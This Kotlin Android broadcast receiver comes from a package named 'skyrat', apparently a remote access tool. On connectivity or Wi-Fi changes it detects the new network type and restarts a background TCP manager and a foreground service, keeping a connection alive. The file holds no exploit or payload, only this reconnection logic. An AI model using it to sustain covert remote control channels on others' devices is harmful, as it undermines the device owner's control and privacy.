package com.techsky.skyrat

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class NetworkChangeReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "NetworkChangeReceiver"
        private var lastNetworkType = ""
        private var isProcessing = false
    }

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            ConnectivityManager.CONNECTIVITY_ACTION,
            "android.net.wifi.WIFI_STATE_CHANGED",
            "android.net.wifi.STATE_CHANGE" -> {

                if (isProcessing) {
                    Log.d(TAG, "Already processing network change, ignoring")
                    return
                }

                Log.d(TAG, "Network change detected: ${intent.action}")
                handleNetworkChange(context)
            }
        }
    }

    private fun handleNetworkChange(context: Context) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                isProcessing = true

                // Small delay to let network settle
                delay(2000)

                val currentNetworkType = getCurrentNetworkType(context)
                Log.d(TAG, "Current network: $currentNetworkType, Last: $lastNetworkType")

                // Check if network actually changed
                if (currentNetworkType != lastNetworkType && currentNetworkType.isNotEmpty()) {
                    Log.d(TAG, "Network changed from '$lastNetworkType' to '$currentNetworkType'")
                    lastNetworkType = currentNetworkType

                    // Force reconnection
                    restartConnection(context)
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error handling network change: ${e.message}")
            } finally {
                // Reset processing flag after delay
                CoroutineScope(Dispatchers.IO).launch {
                    delay(5000)
                    isProcessing = false
                }
            }
        }
    }

    private fun getCurrentNetworkType(context: Context): String {
        return try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork ?: return "none"
                val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return "none"

                when {
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
                    else -> "other"
                }
            } else {
                @Suppress("DEPRECATION")
                val networkInfo = connectivityManager.activeNetworkInfo
                when (networkInfo?.type) {
                    ConnectivityManager.TYPE_WIFI -> "wifi"
                    ConnectivityManager.TYPE_MOBILE -> "cellular"
                    ConnectivityManager.TYPE_ETHERNET -> "ethernet"
                    else -> if (networkInfo?.isConnected == true) "other" else "none"
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting network type: ${e.message}")
            "error"
        }
    }

    private fun restartConnection(context: Context) {
        try {
            Log.d(TAG, "Restarting connection due to network change")

            // Start BackgroundTcpManager
            val backgroundManager = BackgroundTcpManager(context)
            backgroundManager.startConnection()

            // Also try to restart MainService if possible
            try {
                val serviceIntent = Intent(context, MainService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }
                Log.d(TAG, "MainService restarted due to network change")
            } catch (e: Exception) {
                Log.d(TAG, "Could not restart MainService: ${e.message}")
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error restarting connection: ${e.message}")
        }
    }
}